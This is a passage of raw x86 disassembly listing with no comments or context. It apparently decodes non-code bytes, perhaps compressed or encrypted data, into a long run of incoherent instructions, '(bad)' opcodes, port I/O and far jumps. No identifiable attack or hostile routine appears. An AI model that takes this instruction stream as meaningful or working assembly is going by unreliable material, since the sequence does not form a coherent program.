  41d89d:	fs adc ch,bh
  41d8a0:	into   
  41d8a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8a2:	cmp    eax,0x35b4d65a
  41d8a7:	sub    eax,0xca689bfb
  41d8ac:	or     eax,eax
  41d8ae:	dec    ebp
  41d8af:	fwait
  41d8b0:	inc    eax
  41d8b1:	mov    eax,ds:0x2f9cdf0d
  41d8b6:	pop    ecx
  41d8b7:	jmp    0xfdf44b9
  41d8bc:	in     eax,0xc2
  41d8be:	imul   esp,DWORD PTR [edx+0x74d3277f],0xc8f420dd
  41d8c8:	push   esi
  41d8c9:	cwde   
  41d8ca:	call   0x5c8c4751
  41d8cf:	cmp    ecx,DWORD PTR [edi+edi*1+0x7c]
  41d8d3:	fsubr  DWORD PTR [ecx+0x7c6e5a39]
  41d8d9:	fist   WORD PTR [ecx+0x26df24f2]
  41d8df:	pop    ebx
  41d8e0:	mov    edi,DWORD PTR [esi-0x2581a645]
  41d8e6:	mov    ebx,0x6a3f0081
  41d8eb:	cs ret 
  41d8ed:	mov    al,0x1d
  41d8ef:	int    0xb2
  41d8f1:	adc    eax,0x16d4cd98
  41d8f6:	push   ecx
  41d8f7:	dec    esi
  41d8f8:	mov    eax,ds:0x8dfd600b
  41d8fd:	jno    0x41d8fa
  41d8ff:	je     0x41d8cf
  41d901:	dec    BYTE PTR [esi-0x42]
  41d904:	adc    BYTE PTR [ebp-0x7851ad87],ch
  41d90a:	loope  0x41d8dd
  41d90c:	inc    ecx
  41d90d:	les    edi,FWORD PTR ds:0x7e47b9e5
  41d913:	arpl   WORD PTR ds:0x38497457,bx
  41d919:	imul   edi,DWORD PTR ss:[eax+0x68],0x8f25d260
  41d921:	sub    al,0x20
  41d923:	and    eax,DWORD PTR [edx-0x7f]
  41d926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d927:	in     eax,dx
  41d928:	jbe    0x41d8ce
  41d92a:	jp     0x41d937
  41d92c:	test   DWORD PTR [ebx-0x2337214c],edi
  41d932:	sbb    BYTE PTR [eax],bh
  41d934:	or     eax,0xc8aa5509
  41d939:	clc    
  41d93a:	jbe    0x41d946
  41d93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d93d:	and    ebp,edi
  41d93f:	push   eax
  41d940:	and    eax,0x4b659d55
  41d945:	or     eax,0x297b89db
  41d94a:	mov    edi,0x8d270344
  41d94f:	sar    dh,0x4b
  41d952:	adc    BYTE PTR [ecx],al
  41d954:	outs   dx,BYTE PTR ds:[esi]
  41d955:	push   eax
  41d956:	cmp    dh,BYTE PTR [edx]
  41d958:	sbb    eax,DWORD PTR [esi-0x1d]
  41d95b:	addr16 cdq 
  41d95d:	std    
  41d95e:	fdiv   st(5),st
  41d960:	jmp    0x41d994
  41d962:	xor    al,0xfb
  41d964:	into   
  41d965:	mov    edx,0xec0c667d
  41d96a:	add    eax,0x595a1edb
  41d96f:	aaa    
  41d970:	jae    0x41d983
  41d972:	fstp   DWORD PTR [ebp-0x3d]
  41d975:	jae    0x41d9e4
  41d977:	cwde   
  41d978:	adc    eax,0x6f6c1613
  41d97d:	(bad)  
  41d97e:	push   ecx
  41d97f:	scas   al,BYTE PTR es:[edi]
  41d980:	aam    0xbd
  41d982:	aas    
  41d983:	mov    esp,0xe859bbd8
  41d988:	nop
  41d989:	shl    DWORD PTR [edx+0x706a04d4],cl
  41d98f:	push   esi
  41d990:	out    dx,eax
  41d991:	stc    
  41d992:	sub    ebx,esp
  41d994:	adc    DWORD PTR [ecx+0x27a0c712],edi
  41d99a:	(bad)  
  41d99b:	(bad)  
  41d99c:	int    0xb6
  41d99e:	cmp    bh,BYTE PTR ds:0x9fb13cba
  41d9a4:	popf   
  41d9a5:	dec    ebx
  41d9a6:	or     esp,DWORD PTR [eax+0x332a4e80]
  41d9ac:	scas   eax,DWORD PTR es:[edi]
  41d9ad:	stc    
  41d9ae:	mov    dh,BYTE PTR [edi+0x2e]
  41d9b1:	push   ebp
  41d9b2:	and    dl,cl
  41d9b4:	dec    esi
  41d9b5:	loope  0x41da25
  41d9b7:	inc    edi
  41d9b8:	daa    
  41d9b9:	stos   DWORD PTR es:[edi],eax
  41d9ba:	sub    al,0x38
  41d9bc:	stos   DWORD PTR es:[edi],eax
  41d9bd:	ja     0x41d9b1
  41d9bf:	mov    edi,0x99cc9610
  41d9c4:	stos   DWORD PTR es:[edi],eax
  41d9c5:	jnp    0x41d9be
  41d9c7:	mov    ebp,0x40eb8f07
  41d9cc:	mov    ?,ebp
  41d9ce:	std    
  41d9cf:	push   sp
  41d9d1:	mov    ecx,0x7450cd04
  41d9d6:	adc    al,BYTE PTR [edx]
  41d9d8:	push   edi
  41d9d9:	inc    edi
  41d9da:	xor    ch,BYTE PTR [ecx+0xa]
  41d9dd:	shl    DWORD PTR [edx-0xf3fb18a],cl
  41d9e3:	add    BYTE PTR [edx+0x69],0x6a
  41d9e7:	fs call 0x7b421f30
  41d9ed:	inc    esp
  41d9ee:	cld    
  41d9ef:	jp     0x41da1d
  41d9f1:	jbe    0x41d98a
  41d9f3:	sbb    eax,0x2eb20185
  41d9f8:	es loope 0x41da74
  41d9fb:	mov    ch,ch
  41d9fd:	lods   eax,DWORD PTR ds:[esi]
  41d9fe:	dec    ebx
  41d9ff:	sub    cl,BYTE PTR [ecx-0x21709c59]
  41da05:	out    dx,al
  41da06:	push   eax
  41da07:	out    0xdf,eax
  41da09:	sub    al,BYTE PTR [ecx]
  41da0b:	jg     0x41d99b
  41da0d:	iret   
  41da0e:	mov    al,ds:0x191cadf8
  41da13:	sahf   
  41da14:	pushf  
  41da15:	jb     0x41d9fb
  41da17:	pusha  
  41da18:	aam    0xeb
  41da1a:	out    0x7a,eax
  41da1c:	cmp    eax,0x80370380
  41da21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da22:	or     eax,0xcceba16d
  41da27:	fld    DWORD PTR [ecx-0x2c3245e7]
  41da2d:	(bad)  
  41da2e:	in     eax,0x81
  41da30:	mov    dh,0x9a
  41da32:	or     ah,BYTE PTR [ebx+eiz*1]
  41da35:	mov    esp,0x7e9a4908
  41da3a:	in     eax,0x7d
  41da3c:	out    dx,al
  41da3d:	out    0x5c,eax
  41da3f:	aad    0x70
  41da41:	cmp    DWORD PTR [eax],esi
  41da43:	cld    
  41da44:	push   ecx
  41da45:	sub    al,0x3e
  41da47:	ds daa 
  41da49:	daa    
  41da4a:	inc    edx
  41da4b:	jl     0x41da6b
  41da4d:	push   ebp
  41da4e:	cld    
  41da4f:	pop    edi
  41da50:	stc    
  41da51:	push   esp
  41da52:	inc    esp
  41da53:	add    ah,ah
  41da55:	fmul   st(1),st
  41da57:	or     bl,BYTE PTR [esi-0x172fa818]
  41da5d:	push   0xc74e7e52
  41da62:	pop    esi
  41da63:	and    bl,BYTE PTR [edi+0x5]
  41da66:	or     bl,BYTE PTR [esi+eiz*8-0x7]
  41da6a:	dec    ebx
  41da6b:	out    dx,eax
  41da6c:	jno    0x41da54
  41da6e:	(bad)  
  41da6f:	push   DWORD PTR [ecx+ecx*2]
  41da72:	outs   dx,BYTE PTR ds:[esi]
  41da73:	in     eax,0x52
  41da75:	cmp    ch,BYTE PTR [edi]
  41da77:	dec    edx
  41da78:	lea    ebx,[ebp+0x3337a5fa]
  41da7e:	jne    0x41da1c
  41da80:	ret    
  41da81:	xor    bl,BYTE PTR [esi-0x5]
  41da84:	and    al,0x97
  41da86:	data16 das 
  41da88:	push   0xffffffe0
  41da8a:	imul   ecx,DWORD PTR [ecx],0x873430d
  41da90:	or     eax,0xf6b8d99a
  41da95:	leave  
  41da96:	pop    edi
  41da97:	int    0x58
  41da99:	gs adc edx,edi
  41da9c:	xchg   edi,eax
  41da9d:	mov    ecx,0x3dd1efa7
  41daa2:	ss xchg edi,eax
  41daa4:	loopne 0x41dad8
  41daa6:	jbe    0x41da6d
  41daa8:	push   ebx
  41daa9:	aam    0x1e
  41daab:	iret   
  41daac:	dec    edi
  41daad:	mov    bl,0xbe
  41daaf:	push   esi
  41dab0:	fwait
  41dab1:	in     al,0x8e
  41dab3:	mov    al,0x4f
  41dab5:	sahf   
  41dab6:	bound  esp,QWORD PTR cs:[edi-0x413c9229]
  41dabd:	adc    eax,0xb861d210
  41dac2:	and    esi,DWORD PTR [eax-0xf]
  41dac5:	out    dx,eax
  41dac6:	adc    dl,BYTE PTR [esi+0x6e]
  41dac9:	data16 loope 0x41db32
  41dacc:	pop    ds
  41dacd:	mov    esi,0x7397f92f
  41dad2:	outs   dx,DWORD PTR ds:[esi]
  41dad3:	(bad)  
  41dad4:	aaa    
  41dad5:	sbb    BYTE PTR [edi+0x26],dh
  41dad8:	mov    esp,DWORD PTR [edi+0x16c3eb33]
  41dade:	dec    edx
  41dadf:	xchg   ebp,eax
  41dae0:	jmp    0x3a4fdbee
  41dae5:	enter  0x6ab6,0xfe
  41dae9:	cld    
  41daea:	ds not bl
  41daed:	xchg   esp,eax
  41daee:	clc    
  41daef:	adc    al,BYTE PTR [esi+0x619bb4b0]
  41daf5:	inc    BYTE PTR [ebx+0x68f2bcf]
  41dafb:	and    BYTE PTR [ebx],ah
  41dafd:	jo     0x41da7f
  41daff:	push   gs
  41db01:	pop    ebx
  41db02:	(bad)
  41db05:	stc    
  41db06:	or     dl,ch
  41db08:	es adc eax,0xe066a57a
  41db0e:	or     DWORD PTR [eax],ecx
  41db10:	push   ds
  41db11:	mov    ebp,0x392ccb20
  41db16:	adc    DWORD PTR [esi-0x42],edi
  41db19:	cdq    
  41db1a:	push   edx
  41db1b:	add    DWORD PTR [edi+esi*8+0x3b],ecx
  41db1f:	cli    
  41db20:	mov    al,ds:0x16a46362
  41db25:	and    DWORD PTR [ecx],edi
  41db27:	xor    edi,DWORD PTR [edi-0x6b]
  41db2a:	popf   
  41db2b:	fild   DWORD PTR [ecx-0x50f5df19]
  41db31:	adc    eax,0xfa8cfbe
  41db36:	dec    ebp
  41db37:	shr    al,1
  41db39:	outs   dx,BYTE PTR ds:[esi]
  41db3a:	xchg   edi,eax
  41db3b:	jecxz  0x41db15
  41db3d:	dec    ebx
  41db3e:	inc    edi
  41db3f:	mov    bl,0xc2
  41db41:	rcr    DWORD PTR ss:[edi],0x52
  41db45:	adc    esi,esi
  41db47:	retf   0x3b6a
  41db4a:	pop    edx
  41db4b:	pop    edi
  41db4c:	cmc    
  41db4d:	mov    cl,ah
  41db4f:	pop    ebp
  41db50:	push   eax
  41db51:	add    cl,dl
  41db53:	loop   0x41db90
  41db55:	xchg   ebp,eax
  41db56:	push   esp
  41db57:	test   DWORD PTR [ecx],ecx
  41db59:	pop    ebx
  41db5a:	mov    ch,0x6e
  41db5c:	mov    al,0xc3
  41db5e:	sub    esi,ebp
  41db60:	pop    ss
  41db61:	outs   dx,DWORD PTR ds:[esi]
  41db62:	sbb    eax,0x42d9960b
  41db67:	fwait
  41db68:	xchg   esp,eax
  41db69:	daa    
  41db6a:	add    BYTE PTR [esi+ecx*1+0x5fe1e3e0],bl
  41db71:	or     al,0xe8
  41db73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db74:	icebp  
  41db75:	in     eax,0x67
  41db77:	arpl   WORD PTR [ecx+edx*2+0xfccefdb],sp
  41db7e:	shl    DWORD PTR [esi+0x1],1
  41db81:	test   eax,0xc176e4e7
  41db86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db87:	test   DWORD PTR [ebp-0x7b],esp
  41db8a:	cli    
  41db8b:	jns    0x41db43
  41db8d:	fidivr WORD PTR [esi-0x48d6545d]
  41db93:	aad    0x69
  41db95:	mov    ah,0x1f
  41db97:	mov    gs,WORD PTR [ebx-0x18d60564]
  41db9d:	mov    bl,0x10
  41db9f:	mov    cl,0x5a
  41dba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dba2:	out    0x6,eax
  41dba4:	and    al,0x0
  41dba6:	loopne 0x41dbfa
  41dba8:	nop
  41dba9:	sub    DWORD PTR [eax+0x69],eax
  41dbac:	(bad)  
  41dbad:	sar    BYTE PTR [edi+0x198d0a3f],0x1d
  41dbb4:	sbb    eax,0x3fa47e6
  41dbb9:	cmp    DWORD PTR [edi],ebx
  41dbbb:	mov    bl,0x6a
  41dbbd:	ss dec ecx
  41dbbf:	sar    edi,0x46
  41dbc2:	inc    esi
  41dbc3:	lahf   
  41dbc4:	icebp  
  41dbc5:	push   edx
  41dbc6:	or     ch,0x1d
  41dbc9:	xchg   eax,eax
  41dbcb:	(bad)  
  41dbcc:	mov    ds:0x8a0c1fa2,al
  41dbd1:	out    dx,al
  41dbd2:	push   esp
  41dbd3:	pop    ds
  41dbd4:	jl     0x41dc47
  41dbd6:	sub    edi,DWORD PTR [ebx+0xedc3c5d]
  41dbdc:	ja     0x41dbfb
  41dbde:	sbb    esp,DWORD PTR [edx]
  41dbe0:	push   ss
  41dbe1:	cmc    
  41dbe2:	xor    dh,BYTE PTR [edi+esi*4-0x43a53d7]
  41dbe9:	sbb    eax,0xd5cfc25e
  41dbee:	in     eax,0x45
  41dbf0:	inc    eax
  41dbf1:	sub    DWORD PTR [ebp+edi*1+0x397e55e5],edx
  41dbf8:	mov    ch,0xe1
  41dbfa:	stc    
  41dbfb:	aam    0x39
  41dbfd:	pop    ebx
  41dbfe:	jge    0x41dc63
  41dc00:	push   ds
  41dc01:	ror    DWORD PTR [edx+0x5e02397e],cl
  41dc07:	mov    cl,0x2f
  41dc09:	sub    BYTE PTR [edi-0x62],ah
  41dc0c:	(bad)  
  41dc0d:	cmc    
  41dc0e:	pushf  
  41dc0f:	cmc    
  41dc10:	pop    ss
  41dc11:	mov    ebx,DWORD PTR [ebx-0x1567da86]
  41dc17:	test   DWORD PTR [eax+ebx*4-0x47b78c65],ebx
  41dc1e:	aaa    
  41dc1f:	fidivr WORD PTR [esi]
  41dc21:	cld    
  41dc22:	sub    al,0xff
  41dc24:	dec    esi
  41dc25:	out    0x20,eax
  41dc27:	push   ss
  41dc28:	stc    
  41dc29:	aas    
  41dc2a:	out    0x29,al
  41dc2c:	jmp    0x8b1f:0xb748e88f
  41dc33:	adc    bl,al
  41dc35:	and    esp,DWORD PTR [ebp+0x78d5ec9e]
  41dc3b:	jp     0x41dc48
  41dc3d:	data16 jns 0x41dbea
  41dc40:	jmp    0xd3b4e523
  41dc45:	out    0x2,al
  41dc47:	push   esp
  41dc48:	icebp  
  41dc49:	ins    BYTE PTR es:[edi],dx
  41dc4a:	inc    ebx
  41dc4b:	daa    
  41dc4c:	stc    
  41dc4d:	rcr    DWORD PTR [edi+eiz*1-0x3a700e7],0xb9
  41dc55:	les    esi,FWORD PTR ds:0x8c0cdce3
  41dc5b:	dec    edx
  41dc5c:	adc    BYTE PTR [esi+0x7087d3fb],0x3a
  41dc63:	lea    esp,[edi]
  41dc65:	push   eax
  41dc66:	and    al,0xe5
  41dc68:	jg     0x41dc06
  41dc6a:	shr    DWORD PTR [edx-0x3f],0x5a
  41dc6e:	xor    eax,0x8037e49c
  41dc73:	jle    0x41dbfc
  41dc75:	add    al,0x2f
  41dc77:	mov    WORD PTR [ebx+0x57054474],fs
  41dc7d:	mov    dl,0xe5
  41dc7f:	push   0x3d
  41dc81:	repz pop ebp
  41dc83:	lods   al,BYTE PTR ds:[esi]
  41dc84:	cmp    BYTE PTR [edx-0x2f69a70d],ah
  41dc8a:	mov    eax,0x16219f21
  41dc8f:	mov    es,WORD PTR [ecx]
  41dc91:	fsub   DWORD PTR [edi]
  41dc93:	jmp    DWORD PTR [ebx]
  41dc95:	push   cs
  41dc96:	adc    dl,BYTE PTR [esi+0x5a55207f]
  41dc9c:	addr16 mov eax,ds:0xca34
  41dca0:	mov    edi,0xf32e8042
  41dca5:	xor    BYTE PTR [edi+eiz*8],dl
  41dca8:	adc    bh,BYTE PTR [edx]
  41dcaa:	mov    ebp,0x725301be
  41dcaf:	xchg   ebp,eax
  41dcb0:	outs   dx,DWORD PTR ds:[esi]
  41dcb1:	add    BYTE PTR [esi+0x649f21ef],ah
  41dcb7:	inc    ecx
  41dcb8:	data16 lods al,BYTE PTR ds:[esi]
  41dcba:	out    0x2a,al
  41dcbc:	popa   
  41dcbd:	loopne 0x41dc9a
  41dcbf:	(bad)  
  41dcc0:	sahf   
  41dcc1:	inc    edi
  41dcc2:	test   BYTE PTR [eax-0x598913d3],al
  41dcc8:	popa   
  41dcc9:	enter  0x8412,0x1b
  41dccd:	mov    fs,WORD PTR [edi+0x3a]
  41dcd0:	ins    DWORD PTR es:[edi],dx
  41dcd1:	fld    DWORD PTR [edx+0x5212d9c1]
  41dcd7:	jmp    0xad41:0x1e99e8be
  41dcde:	nop
  41dcdf:	out    0x3c,al
  41dce1:	and    bl,BYTE PTR [esi]
  41dce3:	dec    edx
  41dce4:	fcom   DWORD PTR [ebx-0x5d]
  41dce7:	out    dx,al
  41dce8:	dec    edi
  41dce9:	out    0x54,al
  41dceb:	mov    ah,0x85
  41dced:	mov    eax,ds:0x69479d63
  41dcf2:	sar    DWORD PTR [eax+ebx*4-0x2],0xbf
  41dcf7:	or     edx,esi
  41dcf9:	idiv   edi
  41dcfb:	inc    esi
  41dcfc:	shl    BYTE PTR [ebx-0x65c8414],1
  41dd02:	(bad)  
  41dd03:	out    dx,eax
  41dd04:	mov    bh,0xe0
  41dd06:	or     BYTE PTR [edi-0x13bd9d15],dl
  41dd0c:	cld    
  41dd0d:	popf   
  41dd0e:	fbld   TBYTE PTR [ecx]
  41dd10:	iret   
  41dd11:	(bad)  
  41dd12:	outs   dx,BYTE PTR ds:[esi]
  41dd13:	add    BYTE PTR [ebx+eax*2],al
  41dd16:	data16 mov ch,0x2
  41dd19:	test   al,0xac
  41dd1b:	fdiv   DWORD PTR [ecx-0x69871c4]
  41dd21:	outs   dx,BYTE PTR ds:[esi]
  41dd22:	cmp    edi,ecx
  41dd24:	sub    al,0x58
  41dd26:	inc    eax
  41dd27:	jmp    0x4215:0x7e19ead5
  41dd2e:	add    esp,ebx
  41dd30:	fild   WORD PTR es:[esi-0x31724c2a]
  41dd37:	mov    edi,cs
  41dd39:	in     eax,0x77
  41dd3b:	cmp    ebx,eax
  41dd3d:	test   eax,0x9c312b49
  41dd42:	add    edx,edx
  41dd44:	cmc    
  41dd45:	scas   al,BYTE PTR es:[edi]
  41dd46:	mov    esp,0x2d9cb293
  41dd4b:	test   DWORD PTR [ecx+0x47fddf2b],0xb017ff12
  41dd55:	inc    ebp
  41dd56:	mov    edx,0x2aeb630e
  41dd5b:	(bad)  
  41dd5d:	xor    esp,DWORD PTR ds:0xfeeba22a
  41dd63:	jmp    0x8ace:0xc0d96429
  41dd6a:	je     0x41dd47
  41dd6c:	pop    ebx
  41dd6d:	or     al,0xa3
  41dd6f:	xor    dl,al
  41dd71:	sbb    DWORD PTR [edi-0xb],edx
  41dd74:	dec    edi
  41dd75:	add    BYTE PTR [edx+edi*1-0x1],cl
  41dd79:	cmp    DWORD PTR [edi],0x7f23786d
  41dd7f:	or     eax,0x985f25f6
  41dd84:	mov    ecx,0x976ff5e3
  41dd89:	and    DWORD PTR [ebp+0x489b7127],ecx
  41dd8f:	in     eax,0xd8
  41dd91:	icebp  
  41dd92:	pop    ecx
  41dd93:	sub    eax,0xc679a96d
  41dd98:	add    BYTE PTR [edx-0x68],al
  41dd9b:	mov    cl,0x4e
  41dd9d:	aaa    
  41dd9e:	or     ecx,DWORD PTR [ebx-0x27]
  41dda1:	push   eax
  41dda2:	jmp    0x41dd2e
  41dda4:	imul   esp,DWORD PTR [ebx-0x55],0xe
  41dda8:	call   0xf7f1:0xb6498788
  41ddaf:	add    ch,0xa9
  41ddb2:	dec    edx
  41ddb3:	enter  0x9b17,0x32
  41ddb7:	jmp    FWORD PTR [ecx+0x58]
  41ddba:	imul   eax,DWORD PTR [ebx-0x4f],0xa926e4b9
  41ddc1:	sbb    al,0x98
  41ddc3:	pop    ecx
  41ddc4:	xchg   edi,eax
  41ddc5:	sbb    al,0xd
  41ddc7:	xchg   ecx,eax
  41ddc8:	imul   ecx,DWORD PTR [ecx+ebx*1-0x1fecf9cb],0x10
  41ddd0:	shl    esp,0xf
  41ddd3:	call   0xcd2c29aa
  41ddd8:	push   ds
  41ddd9:	xchg   esp,eax
  41ddda:	(bad)  
  41dddb:	and    al,0xc8
  41dddd:	mov    ch,0x9c
  41dddf:	into   
  41dde0:	adc    edx,ebx
  41dde2:	(bad)  
  41dde3:	in     al,0xd4
  41dde5:	sub    esp,ecx
  41dde7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dde8:	sbb    DWORD PTR [edi+esi*8-0x70],0xffffffdc
  41dded:	pop    es
  41ddee:	or     ah,BYTE PTR [ebp-0x34]
  41ddf1:	add    DWORD PTR [ebx+0x125e67a8],edi
  41ddf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddf8:	mov    dl,0xe9
  41ddfa:	push   0x67
  41ddfc:	dec    ebp
  41ddfd:	sbb    eax,0x4dba87d0
  41de02:	ss fldpi 
  41de05:	adc    eax,0x8da0a4e8
  41de0a:	jecxz  0x41de2b
  41de0c:	imul   ecx,ebp,0xffffffca
  41de0f:	xor    eax,0x8915314f
  41de14:	lahf   
  41de15:	sbb    ebp,ecx
  41de17:	je     0x41ddf1
  41de19:	and    esi,DWORD PTR [esi-0x21]
  41de1c:	and    bl,bh
  41de1e:	(bad)  
  41de1f:	push   ebp
  41de20:	mov    eax,ds:0x592dec70
  41de25:	fldcw  WORD PTR [ebx+ebx*2-0x37]
  41de29:	fsubr  DWORD PTR [eax]
  41de2b:	push   esi
  41de2c:	and    DWORD PTR [ecx+0x209f8e51],ecx
  41de32:	jbe    0x41de64
  41de34:	mov    ecx,0x720712d8
  41de39:	mov    al,bl
  41de3b:	loope  0x41de44
  41de3d:	dec    edx
  41de3e:	push   ecx
  41de3f:	mov    esi,eax
  41de41:	or     bh,BYTE PTR [edi]
  41de43:	mov    esi,0x4c9c3a70
  41de48:	push   ebx
  41de49:	push   esi
  41de4a:	cwde   
  41de4b:	add    al,0x66
  41de4d:	std    
  41de4e:	and    BYTE PTR [ebp-0x6],ah
  41de51:	jbe    0x41de9c
  41de53:	sub    eax,eax
  41de55:	ret    
  41de56:	sbb    DWORD PTR [eax],esp
  41de58:	xor    eax,DWORD PTR [ebp-0x52]
  41de5b:	mov    BYTE PTR [edx],0x6b
  41de5e:	cmp    eax,0x5baf412d
  41de63:	mov    edx,0xeddaba14
  41de68:	mov    dh,bl
  41de6a:	lahf   
  41de6b:	or     al,0xd6
  41de6d:	cmp    DWORD PTR [edi+eax*8+0x5d5cfdf1],esi
  41de74:	int3   
  41de75:	or     dl,BYTE PTR ds:0xe2b5c1d1
  41de7b:	std    
  41de7c:	mov    DWORD PTR [edi+0x6f],ebp
  41de7f:	sti    
  41de80:	jge    0x41dec6
  41de82:	jg     0x41de65
  41de84:	aaa    
  41de85:	mov    bh,0xd9
  41de87:	into   
  41de88:	mov    eax,0x9488deb
  41de8d:	and    eax,DWORD PTR [edi]
  41de8f:	gs mov esp,0xb97c5465
  41de95:	sbb    al,0xc0
  41de97:	or     DWORD PTR [eax+edi*2-0x7ffcbf7],edx
  41de9e:	std    
  41de9f:	nop
  41dea0:	inc    ebp
  41dea1:	mov    ah,0xc8
  41dea3:	in     eax,0x5d
  41dea5:	js     0x41de72
  41dea7:	cmp    eax,0xbd2cf058
  41deac:	and    al,0x33
  41deae:	ret    0x3aeb
  41deb1:	call   0x5342:0x42a1e4fd
  41deb8:	rcr    ch,0x0
  41debb:	rcl    DWORD PTR [edi+0x781fa7a0],0x52
  41dec2:	pop    esp
  41dec3:	mov    es,edx
  41dec5:	mov    ds:0x159d567b,eax
  41deca:	jbe    0x41dee4
  41decc:	sub    BYTE PTR [esp+esi*4-0x9e88069],cl
  41ded3:	cld    
  41ded4:	and    bl,BYTE PTR [edi]
  41ded6:	jmp    0x18fc:0x919a1c2a
  41dedd:	inc    esi
  41dede:	aam    0x4
  41dee0:	in     al,0xc8
  41dee2:	add    eax,0x4a9284e3
  41dee7:	sub    eax,0xa7e7da6d
  41deec:	adc    ch,BYTE PTR ds:[ebp-0x57]
  41def0:	sbb    DWORD PTR [edx],ecx
  41def2:	sub    BYTE PTR [ebp+eiz*1-0x47],al
  41def6:	data16 data16 or al,0xd7
  41defa:	mov    ds:0xddec6674,al
  41deff:	push   esi
  41df00:	mov    al,dh
  41df02:	bound  ebp,QWORD PTR [ecx+0x6a0b6b0c]
  41df08:	mov    esi,DWORD PTR [ecx+0x54e71687]
  41df0e:	div    bh
  41df10:	dec    edi
  41df11:	retf   0xa151
  41df14:	add    cl,BYTE PTR [edx-0x2d0cb39a]
  41df1a:	in     eax,0x87
  41df1c:	mov    al,0x52
  41df1e:	xor    eax,0x5cb04044
  41df23:	shr    BYTE PTR [ecx-0x57],0x62
  41df27:	push   ds
  41df28:	xchg   BYTE PTR [eax],dl
  41df2a:	pop    esi
  41df2b:	cdq    
  41df2c:	imul   ebp,DWORD PTR [ebp-0x6a],0xf7edc92d
  41df33:	mov    ch,0x64
  41df35:	adc    BYTE PTR [eax-0x8],dl
  41df38:	lea    bx,[ecx+esi*1]
  41df3c:	cmp    al,0x1d
  41df3e:	add    al,bh
  41df40:	sbb    BYTE PTR [ebx+0x1f],ch
  41df43:	(bad)  
  41df44:	ja     0x41df81
  41df46:	or     ah,ah
  41df48:	dec    ebp
  41df49:	js     0x41df42
  41df4b:	arpl   WORD PTR [esi],dx
  41df4d:	cmp    BYTE PTR [ebx],bl
  41df4f:	or     DWORD PTR [eax+0x57],ecx
  41df52:	out    dx,al
  41df53:	gs pushaw 
  41df56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df57:	jmp    0x41def4
  41df59:	push   ebx
  41df5a:	sbb    BYTE PTR [ecx+edi*1+0x350e4692],bl
  41df61:	adc    BYTE PTR [edi+0x745467d9],dl
  41df67:	mov    ebp,0x21a8fe01
  41df6c:	lea    eax,[esi+0x22]
  41df6f:	aas    
  41df70:	and    BYTE PTR [ebx+0x61],cl
  41df73:	xor    eax,0xfdea77db
  41df78:	mov    esi,0x531be8ce
  41df7d:	sbb    BYTE PTR [ebp+ecx*8-0x2a],dh
  41df81:	sbb    cl,BYTE PTR [ebx-0x10]
  41df84:	push   ds
  41df85:	sbb    BYTE PTR [eax+0x69],0x2f
  41df89:	jl     0x41dff8
  41df8b:	shl    DWORD PTR [edi],1
  41df8d:	push   eax
  41df8e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df90:	mov    ds:0x8b1758b6,al
  41df95:	adc    bl,dh
  41df97:	outs   dx,DWORD PTR ds:[esi]
  41df98:	fcom   DWORD PTR [eax-0x6fa9c681]
  41df9e:	imul   esi,DWORD PTR [ecx+0x42d796c9],0x37
  41dfa5:	inc    edx
  41dfa6:	cdq    
  41dfa7:	loopne 0x41dff8
  41dfa9:	stos   DWORD PTR es:[edi],eax
  41dfaa:	cmp    dh,BYTE PTR [ebp+0x6f]
  41dfad:	aas    
  41dfae:	dec    edx
  41dfaf:	(bad)  
  41dfb0:	mov    edi,0x6c914b83
  41dfb5:	int3   
  41dfb6:	mov    al,ds:0x62a5ac75
  41dfbb:	out    dx,eax
  41dfbc:	rol    bl,1
  41dfbe:	xor    BYTE PTR [ecx-0x40],bl
  41dfc1:	fistp  QWORD PTR [eax+0x70]
  41dfc4:	inc    esp
  41dfc5:	out    0xc,al
  41dfc7:	sub    esi,edx
  41dfc9:	sub    ah,BYTE PTR [ebp+0x44]
  41dfcc:	sbb    BYTE PTR [esp+esi*1-0x76],cl
  41dfd0:	dec    ebp
  41dfd1:	dec    edx
  41dfd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfd3:	stc    
  41dfd4:	js     0x41e008
  41dfd6:	and    al,0xac
  41dfd8:	add    esp,ecx
  41dfda:	xor    cl,BYTE PTR ds:0x245c1b7e
  41dfe0:	lea    eax,[ecx-0x41]
  41dfe3:	inc    ebp
  41dfe4:	fimul  DWORD PTR [edx-0x43]
  41dfe7:	ja     0x41e01b
  41dfe9:	out    0x29,eax
  41dfeb:	cmp    edx,DWORD PTR [ecx-0x7e]
  41dfee:	xor    DWORD PTR [edx],eax
  41dff0:	lds    ebx,FWORD PTR [eax-0x6b74d3e]
  41dff6:	jne    0x41dfef
  41dff8:	xlat   BYTE PTR ds:[ebx]
  41dff9:	push   edi
  41dffa:	and    DWORD PTR ds:0xe5b516c1,ebp
  41e000:	or     ebp,esp
  41e002:	mov    esi,0xe02e2230
  41e007:	int3   
  41e008:	jle    0x41e04b
  41e00a:	adc    ch,cl
  41e00c:	adc    BYTE PTR [esi+0x7d],0x69
  41e010:	jge    0x41dfcc
  41e012:	jle    0x41e052
  41e014:	clc    
  41e015:	pop    ebx
  41e016:	jns    0x41dfa8
  41e018:	lea    eax,[ecx]
  41e01a:	jnp    0x41e008
  41e01c:	out    0x7a,eax
  41e01e:	shl    BYTE PTR [esi+edi*4+0x7c],1
  41e022:	fs inc edi
  41e024:	in     al,0xb3
  41e026:	push   edx
  41e027:	stos   DWORD PTR es:[edi],eax
  41e028:	cs or  al,0x2a
  41e02b:	xchg   esp,eax
  41e02c:	jno    0x41dfda
  41e02e:	push   es
  41e02f:	jp     0x41e087
  41e031:	je     0x41e04c
  41e033:	in     eax,dx
  41e034:	jecxz  0x41e060
  41e036:	mov    ds:0xeee0f701,eax
  41e03b:	and    eax,0x9377fbcc
  41e040:	mov    esp,0x35323b14
  41e045:	inc    ebx
  41e046:	pop    esp
  41e047:	sar    DWORD PTR [esi-0x2e],0x92
  41e04b:	mov    ebx,0x492e7618
  41e050:	jl     0x41e08a
